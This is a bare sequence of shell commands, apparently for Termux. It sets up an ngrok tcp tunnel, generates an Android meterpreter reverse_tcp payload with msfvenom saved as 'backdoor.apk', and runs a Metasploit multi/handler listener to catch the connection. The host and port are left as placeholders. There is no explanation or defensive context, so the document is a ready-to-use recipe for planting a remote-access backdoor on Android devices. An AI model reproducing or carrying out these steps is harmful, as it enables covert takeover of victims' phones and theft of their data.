apt install apache2

pg_ctl -D $PREFIX/var/lib/postgresql start

psql secret

ngrok tcp 8080

ping 0.tcp.ngrok.io

msfvenom -p android/meterpreter/reverse_tcp lhost=~~ lport=~~    -o backdoor.apk

msfconsole

use multi/handler

set payload android/meterpreter/reverse_tcp

set lhost ~~

set lport ~~

exploit
